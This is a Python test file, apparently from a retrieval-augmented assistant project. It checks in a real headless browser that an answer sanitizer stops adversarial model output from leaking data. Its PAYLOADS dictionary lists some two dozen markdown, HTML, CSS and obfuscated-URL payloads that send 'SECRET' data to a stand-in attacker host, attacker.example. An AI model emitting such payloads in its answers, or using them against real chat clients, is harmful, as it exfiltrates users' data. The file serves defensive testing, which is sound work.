"""R-2 v2 acceptance: adversarial answers through a REAL rendering pipeline.

Each answer is rendered by a real CommonMark renderer in its most dangerous
configuration (raw HTML enabled + linkify) and, separately, inserted as raw
innerHTML (a careless chat client). Real Chromium loads each page; every
network request is intercepted and every element is hovered. No request may
reach the attacker, no dialog may open, no live link may point at the
attacker or a script scheme.

A control proves the probe is meaningful: the same payloads UNSANITIZED leak.
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
from pathlib import Path

import pytest
from markdown_it import MarkdownIt

from packages.rag_core.output_safety import OutputLinkPolicy, sanitize_answer

ROOT = Path(__file__).resolve().parents[2]
NODE_MODULES = Path(os.environ.get("ACCESSPROOF_NODE_MODULES", ROOT / "web-v2" / "node_modules"))
CHROMIUM = os.environ.get("ACCESSPROOF_CHROMIUM", "/opt/pw-browsers/chromium")
pytestmark = pytest.mark.skipif(
    not shutil.which("node") or not (NODE_MODULES / "playwright").exists() or not Path(CHROMIUM).exists(),
    reason="node + playwright + chromium required for real-renderer tests",
)

POLICY = OutputLinkPolicy.from_csv("contoso.sharepoint.com")
EVIL = "attacker.example"
PAYLOADS = {
    "md_image": f"Summary. ![s](https://{EVIL}/p.png?d=SECRET)",
    "md_image_entity": f"![s](&#104;ttps://{EVIL}/p.png?d=SECRET)",
    "md_image_percent_host": "![s](https://%61ttacker.example/p.png)",
    "md_image_protocol_relative": f"![s](//{EVIL}/p.png)",
    "html_img": f'<img src="https://{EVIL}/p.png?d=SECRET">',
    "html_img_onerror": f"<img src=x onerror=\"new Image().src='https://{EVIL}/?d=1'\">",
    "css_url_entity": f'<div style="background:url(&#104;ttps://{EVIL}/?d=SECRET)">x</div>',
    "css_import": f"<style>@import url(https://{EVIL}/x.css)</style>",
    "event_handler_hover": f"<p onmouseover=\"fetch('https://{EVIL}/'+1)\">hover me</p>",
    "svg_image": f'<svg><image href="https://{EVIL}/x.png"/></svg>',
    "iframe": f'<iframe src="https://{EVIL}/frame"></iframe>',
    "meta_refresh": f'<meta http-equiv="refresh" content="0;url=https://{EVIL}/">',
    "link_prefetch": f'<link rel="prefetch" href="https://{EVIL}/pf">',
    "object_data": f'<object data="https://{EVIL}/o"></object>',
    "video_poster": f'<video poster="https://{EVIL}/v.png"></video>',
    "fullwidth_bare": "ｈｔｔｐｓ://attacker.example/?d=SECRET",
    "www_autolink": "see www.attacker.example/?d=SECRET",
    "md_link_entity_colon": f"[x](https&#58;//{EVIL}/?d=SECRET)",
    "md_link_backslash_authority": f"[x](https://{EVIL}\\.contoso.sharepoint.com/)",
    "md_link_userinfo": f"[x](https://contoso.sharepoint.com@{EVIL}/)",
    "md_javascript_angle": "[x](<java\tscript:alert(1)>)",
    "md_reference_image": f"![x][r]\n\n[r]: https://{EVIL}/r.png",
    "autolink_entity": f"<https&#58;//{EVIL}/?d=SECRET>",
    "zero_width_scheme": f"![x](ht​tps://{EVIL}/z.png)",
    "double_entity": f"![x](https&amp;#58;//{EVIL}/d.png)",
}
RENDER = MarkdownIt("commonmark", {"html": True, "linkify": True}).enable("linkify")


def _pages(texts: dict[str, str]) -> list[dict[str, str]]:
    pages = []
    for name, text in texts.items():
        pages.append({"name": name, "mode": "markdown_html_linkify", "html": RENDER.render(text)})
        pages.append({"name": name, "mode": "raw_innerhtml", "html": f"<div>{text}</div>"})
    return pages


def _probe(tmp_path: Path, pages: list[dict[str, str]]) -> list[dict]:
    spec = tmp_path / "pages.json"
    spec.write_text(json.dumps(pages))
    env = {**os.environ, "ACCESSPROOF_NODE_MODULES": str(NODE_MODULES), "ACCESSPROOF_CHROMIUM": CHROMIUM}
    out = subprocess.run(["node", str(Path(__file__).with_name("renderer_probe.cjs")), str(spec)],
                         capture_output=True, text=True, env=env, timeout=300, check=True)
    return json.loads(out.stdout)


def _leaks(result: dict) -> list[str]:
    bad = [u for u in result["requests"] if EVIL in u]
    bad += [f"dialog:{d}" for d in result["dialogs"]]
    bad += [f"link:{h}" for h in result["links"] if EVIL in h or h.lower().startswith("javascript:")]
    return bad


def test_control_unsanitized_payloads_really_leak_through_the_renderer(tmp_path):
    results = _probe(tmp_path, _pages(PAYLOADS))
    leaking = {r["name"] for r in results if _leaks(r)}
    # The probe must detect real zero-click leaks, or the main test proves nothing.
    assert {"md_image", "html_img", "css_url_entity", "event_handler_hover", "iframe",
            "md_image_entity", "md_reference_image"} <= leaking, leaking


def test_sanitized_answers_never_reach_the_attacker_in_a_real_browser(tmp_path):
    sanitized = {name: sanitize_answer(text, POLICY)[0] for name, text in PAYLOADS.items()}
    results = _probe(tmp_path, _pages(sanitized))
    failures = {f"{r['name']}/{r['mode']}": _leaks(r) for r in results if _leaks(r)}
    assert failures == {}


def test_allowed_citations_stay_clickable(tmp_path):
    text = "Per the [plan](https://contoso.sharepoint.com/sites/f/plan.docx) see https://contoso.sharepoint.com/x."
    safe, removed = sanitize_answer(text, POLICY)
    assert removed == 0
    results = _probe(tmp_path, [{"name": "legit", "mode": "markdown_html_linkify", "html": RENDER.render(safe)}])
    assert "https://contoso.sharepoint.com/sites/f/plan.docx" in results[0]["links"]
    assert "https://contoso.sharepoint.com/x" in results[0]["links"]
